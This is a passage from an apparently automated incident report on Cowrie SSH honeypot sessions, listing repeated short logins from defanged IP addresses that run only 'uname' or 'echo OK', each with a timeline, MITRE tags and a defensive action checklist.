| `2026-06-27 13:02:20` | `cowrie.session.connect` |
| `2026-06-27 13:02:20` | `cowrie.client.version` |
| `2026-06-27 13:02:20` | `cowrie.client.kex` |
| `2026-06-27 13:02:21` | `cowrie.login.success` |
| `2026-06-27 13:02:21` | `cowrie.session.params` |
| `2026-06-27 13:02:21` | `cowrie.command.input` |
| `2026-06-27 13:02:22` | `cowrie.log.closed` |
| `2026-06-27 13:02:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-efb8c8c80905

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 13:03 |
| **Last Seen** | 2026-06-27 13:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 13:03:14` | `cowrie.session.connect` |
| `2026-06-27 13:03:14` | `cowrie.client.version` |
| `2026-06-27 13:03:14` | `cowrie.client.kex` |
| `2026-06-27 13:03:14` | `cowrie.login.success` |
| `2026-06-27 13:03:15` | `cowrie.session.params` |
| `2026-06-27 13:03:15` | `cowrie.command.input` |
| `2026-06-27 13:03:15` | `cowrie.log.closed` |
| `2026-06-27 13:03:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1cd9d8f3b244

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 13:04 |
| **Last Seen** | 2026-06-27 13:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 13:04:08` | `cowrie.session.connect` |
| `2026-06-27 13:04:08` | `cowrie.client.version` |
| `2026-06-27 13:04:08` | `cowrie.client.kex` |
| `2026-06-27 13:04:08` | `cowrie.login.success` |
| `2026-06-27 13:04:09` | `cowrie.session.params` |
| `2026-06-27 13:04:09` | `cowrie.command.input` |
| `2026-06-27 13:04:09` | `cowrie.log.closed` |
| `2026-06-27 13:04:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-298908850e67

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-06-27 13:04 |
| **Last Seen** | 2026-06-27 13:04 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 13:04:24` | `cowrie.session.connect` |
| `2026-06-27 13:04:25` | `cowrie.client.version` |
| `2026-06-27 13:04:25` | `cowrie.client.kex` |
| `2026-06-27 13:04:31` | `cowrie.login.success` |
| `2026-06-27 13:04:34` | `cowrie.session.params` |
| `2026-06-27 13:04:34` | `cowrie.command.input` |
| `2026-06-27 13:04:36` | `cowrie.log.closed` |
| `2026-06-27 13:04:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8f3c7335a144

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 13:05 |
| **Last Seen** | 2026-06-27 13:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 13:05:03` | `cowrie.session.connect` |
| `2026-06-27 13:05:03` | `cowrie.client.version` |
| `2026-06-27 13:05:03` | `cowrie.client.kex` |
| `2026-06-27 13:05:03` | `cowrie.login.success` |
| `2026-06-27 13:05:04` | `cowrie.session.params` |
| `2026-06-27 13:05:04` | `cowrie.command.input` |
| `2026-06-27 13:05:04` | `cowrie.log.closed` |
| `2026-06-27 13:05:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9ae2d34f1d14

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 13:05 |
| **Last Seen** | 2026-06-27 13:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 13:05:59` | `cowrie.session.connect` |
| `2026-06-27 13:05:59` | `cowrie.client.version` |
| `2026-06-27 13:05:59` | `cowrie.client.kex` |
| `2026-06-27 13:06:00` | `cowrie.login.success` |
| `2026-06-27 13:06:01` | `cowrie.session.params` |
| `2026-06-27 13:06:01` | `cowrie.command.input` |
| `2026-06-27 13:06:01` | `cowrie.log.closed` |
| `2026-06-27 13:06:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b561c8c342c6

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 13:06 |
| **Last Seen** | 2026-06-27 13:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 13:06:56` | `cowrie.session.connect` |
| `2026-06-27 13:06:56` | `cowrie.client.version` |
| `2026-06-27 13:06:56` | `cowrie.client.kex` |
| `2026-06-27 13:06:56` | `cowrie.login.success` |
| `2026-06-27 13:06:57` | `cowrie.session.params` |
| `2026-06-27 13:06:57` | `cowrie.command.input` |
| `2026-06-27 13:06:57` | `cowrie.log.closed` |
| `2026-06-27 13:06:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1898ffdb234b

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 13:07 |
| **Last Seen** | 2026-06-27 13:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 13:07:52` | `cowrie.session.connect` |
| `2026-06-27 13:07:52` | `cowrie.client.version` |
| `2026-06-27 13:07:52` | `cowrie.client.kex` |
| `2026-06-27 13:07:53` | `cowrie.login.success` |
| `2026-06-27 13:07:53` | `cowrie.session.params` |
| `2026-06-27 13:07:53` | `cowrie.command.input` |
| `2026-06-27 13:07:54` | `cowrie.log.closed` |
| `2026-06-27 13:07:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cb2335ebf9ee

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 13:08 |
| **Last Seen** | 2026-06-27 13:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 13:08:46` | `cowrie.session.connect` |
| `2026-06-27 13:08:46` | `cowrie.client.version` |
| `2026-06-27 13:08:46` | `cowrie.client.kex` |
| `2026-06-27 13:08:47` | `cowrie.login.success` |
| `2026-06-27 13:08:47` | `cowrie.session.params` |
| `2026-06-27 13:08:47` | `cowrie.command.input` |
| `2026-06-27 13:08:47` | `cowrie.log.closed` |
| `2026-06-27 13:08:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d969ff4147c8

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 13:09 |
| **Last Seen** | 2026-06-27 13:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 13:09:40` | `cowrie.session.connect` |
| `2026-06-27 13:09:40` | `cowrie.client.version` |
| `2026-06-27 13:09:40` | `cowrie.client.kex` |
| `2026-06-27 13:09:40` | `cowrie.login.success` |
| `2026-06-27 13:09:41` | `cowrie.session.params` |
| `2026-06-27 13:09:41` | `cowrie.command.input` |
| `2026-06-27 13:09:41` | `cowrie.log.closed` |
| `2026-06-27 13:09:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9ddcb9f37e63

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 13:10 |
| **Last Seen** | 2026-06-27 13:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 13:10:36` | `cowrie.session.connect` |
| `2026-06-27 13:10:36` | `cowrie.client.version` |
| `2026-06-27 13:10:36` | `cowrie.client.kex` |
| `2026-06-27 13:10:37` | `cowrie.login.success` |
| `2026-06-27 13:10:38` | `cowrie.session.params` |
| `2026-06-27 13:10:38` | `cowrie.command.input` |
| `2026-06-27 13:10:38` | `cowrie.log.closed` |
| `2026-06-27 13:10:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0f1ec6b603c9

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 13:11 |
| **Last Seen** | 2026-06-27 13:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 13:11:35` | `cowrie.session.connect` |
| `2026-06-27 13:11:35` | `cowrie.client.version` |
| `2026-06-27 13:11:35` | `cowrie.client.kex` |
| `2026-06-27 13:11:35` | `cowrie.login.success` |
| `2026-06-27 13:11:36` | `cowrie.session.params` |
| `2026-06-27 13:11:36` | `cowrie.command.input` |
| `2026-06-27 13:11:36` | `cowrie.log.closed` |
| `2026-06-27 13:11:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-abc270c0b061

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 13:12 |
| **Last Seen** | 2026-06-27 13:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 13:12:31` | `cowrie.session.connect` |
| `2026-06-27 13:12:31` | `cowrie.client.version` |
| `2026-06-27 13:12:31` | `cowrie.client.kex` |
| `2026-06-27 13:12:31` | `cowrie.login.success` |
| `2026-06-27 13:12:32` | `cowrie.session.params` |
| `2026-06-27 13:12:32` | `cowrie.command.input` |
| `2026-06-27 13:12:32` | `cowrie.log.closed` |
| `2026-06-27 13:12:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d8579fc31796

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-06-27 13:12 |
| **Last Seen** | 2026-06-27 13:12 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 13:12:48` | `cowrie.session.connect` |
| `2026-06-27 13:12:49` | `cowrie.client.version` |
| `2026-06-27 13:12:49` | `cowrie.client.kex` |
| `2026-06-27 13:12:51` | `cowrie.login.success` |
| `2026-06-27 13:12:52` | `cowrie.session.params` |
| `2026-06-27 13:12:52` | `cowrie.command.input` |
| `2026-06-27 13:12:52` | `cowrie.log.closed` |
| `2026-06-27 13:12:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd93f5d35316

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 13:13 |
| **Last Seen** | 2026-06-27 13:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 13:13:28` | `cowrie.session.connect` |
| `2026-06-27 13:13:28` | `cowrie.client.version` |
| `2026-06-27 13:13:28` | `cowrie.client.kex` |
| `2026-06-27 13:13:28` | `cowrie.login.success` |
| `2026-06-27 13:13:29` | `cowrie.session.params` |
| `2026-06-27 13:13:29` | `cowrie.command.input` |
| `2026-06-27 13:13:29` | `cowrie.log.closed` |
| `2026-06-27 13:13:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-93b2378961a0

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 13:14 |
| **Last Seen** | 2026-06-27 13:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 13:14:28` | `cowrie.session.connect` |
| `2026-06-27 13:14:28` | `cowrie.client.version` |
| `2026-06-27 13:14:28` | `cowrie.client.kex` |
| `2026-06-27 13:14:29` | `cowrie.login.success` |
| `2026-06-27 13:14:29` | `cowrie.session.params` |
| `2026-06-27 13:14:29` | `cowrie.command.input` |
| `2026-06-27 13:14:30` | `cowrie.log.closed` |
| `2026-06-27 13:14:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c4ba1b53c844

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 13:15 |
| **Last Seen** | 2026-06-27 13:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 13:15:27` | `cowrie.session.connect` |
| `2026-06-27 13:15:27` | `cowrie.client.version` |
| `2026-06-27 13:15:27` | `cowrie.client.kex` |
| `2026-06-27 13:15:28` | `cowrie.login.success` |
| `2026-06-27 13:15:28` | `cowrie.session.params` |
| `2026-06-27 13:15:28` | `cowrie.command.input` |
| `2026-06-27 13:15:28` | `cowrie.log.closed` |
| `2026-06-27 13:15:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eaf83a6d9f61

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-06-27 13:16 |
| **Last Seen** | 2026-06-27 13:16 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 13:16:10` | `cowrie.session.connect` |
| `2026-06-27 13:16:11` | `cowrie.client.version` |
| `2026-06-27 13:16:11` | `cowrie.client.kex` |
| `2026-06-27 13:16:16` | `cowrie.login.success` |
| `2026-06-27 13:16:19` | `cowrie.session.params` |
| `2026-06-27 13:16:19` | `cowrie.command.input` |
| `2026-06-27 13:16:21` | `cowrie.log.closed` |
| `2026-06-27 13:16:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-38c98b3942be

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 13:16 |
| **Last Seen** | 2026-06-27 13:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 13:16:26` | `cowrie.session.connect` |
| `2026-06-27 13:16:26` | `cowrie.client.version` |
| `2026-06-27 13:16:26` | `cowrie.client.kex` |
| `2026-06-27 13:16:27` | `cowrie.login.success` |
| `2026-06-27 13:16:27` | `cowrie.session.params` |
| `2026-06-27 13:16:27` | `cowrie.command.input` |
| `2026-06-27 13:16:28` | `cowrie.log.closed` |
| `2026-06-27 13:16:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4c478cbfea16

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 13:17 |
| **Last Seen** | 2026-06-27 13:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 13:17:22` | `cowrie.session.connect` |
| `2026-06-27 13:17:22` | `cowrie.client.version` |
| `2026-06-27 13:17:22` | `cowrie.client.kex` |
| `2026-06-27 13:17:22` | `cowrie.login.success` |
| `2026-06-27 13:17:23` | `cowrie.session.params` |
| `2026-06-27 13:17:23` | `cowrie.command.input` |
| `2026-06-27 13:17:23` | `cowrie.log.closed` |
| `2026-06-27 13:17:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-87741bea3592

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 13:18 |
| **Last Seen** | 2026-06-27 13:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 13:18:20` | `cowrie.session.connect` |
| `2026-06-27 13:18:20` | `cowrie.client.version` |
| `2026-06-27 13:18:20` | `cowrie.client.kex` |
| `2026-06-27 13:18:20` | `cowrie.login.success` |
| `2026-06-27 13:18:21` | `cowrie.session.params` |
| `2026-06-27 13:18:21` | `cowrie.command.input` |
| `2026-06-27 13:18:21` | `cowrie.log.closed` |
| `2026-06-27 13:18:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-109fc99e3e02

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 13:19 |
| **Last Seen** | 2026-06-27 13:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 13:19:18` | `cowrie.session.connect` |
| `2026-06-27 13:19:18` | `cowrie.client.version` |
| `2026-06-27 13:19:18` | `cowrie.client.kex` |
| `2026-06-27 13:19:18` | `cowrie.login.success` |
| `2026-06-27 13:19:19` | `cowrie.session.params` |
| `2026-06-27 13:19:19` | `cowrie.command.input` |
| `2026-06-27 13:19:19` | `cowrie.log.closed` |
| `2026-06-27 13:19:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd516db914c3

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 13:20 |
| **Last Seen** | 2026-06-27 13:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 13:20:15` | `cowrie.session.connect` |
| `2026-06-27 13:20:15` | `cowrie.client.version` |
| `2026-06-27 13:20:15` | `cowrie.client.kex` |
| `2026-06-27 13:20:16` | `cowrie.login.success` |
| `2026-06-27 13:20:16` | `cowrie.session.params` |
| `2026-06-27 13:20:16` | `cowrie.command.input` |
| `2026-06-27 13:20:17` | `cowrie.log.closed` |
| `2026-06-27 13:20:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-224f1ad6d2b6

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 13:21 |
| **Last Seen** | 2026-06-27 13:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 13:21:12` | `cowrie.session.connect` |
| `2026-06-27 13:21:12` | `cowrie.client.version` |
| `2026-06-27 13:21:12` | `cowrie.client.kex` |
| `2026-06-27 13:21:12` | `cowrie.login.success` |
| `2026-06-27 13:21:13` | `cowrie.session.params` |
| `2026-06-27 13:21:13` | `cowrie.command.input` |
| `2026-06-27 13:21:13` | `cowrie.log.closed` |
| `2026-06-27 13:21:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-df897d63b3ea

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 13:22 |
| **Last Seen** | 2026-06-27 13:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 13:22:07` | `cowrie.session.connect` |
| `2026-06-27 13:22:07` | `cowrie.client.version` |
| `2026-06-27 13:22:07` | `cowrie.client.kex` |
| `2026-06-27 13:22:08` | `cowrie.login.success` |
| `2026-06-27 13:22:08` | `cowrie.session.params` |
| `2026-06-27 13:22:08` | `cowrie.command.input` |
| `2026-06-27 13:22:09` | `cowrie.log.closed` |
| `2026-06-27 13:22:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c1da682e3924

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 13:23 |
| **Last Seen** | 2026-06-27 13:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 13:23:04` | `cowrie.session.connect` |
| `2026-06-27 13:23:04` | `cowrie.client.version` |
| `2026-06-27 13:23:04` | `cowrie.client.kex` |
| `2026-06-27 13:23:04` | `cowrie.login.success` |
| `2026-06-27 13:23:05` | `cowrie.session.params` |
| `2026-06-27 13:23:05` | `cowrie.command.input` |
| `2026-06-27 13:23:05` | `cowrie.log.closed` |
| `2026-06-27 13:23:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8090131ee0ce

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
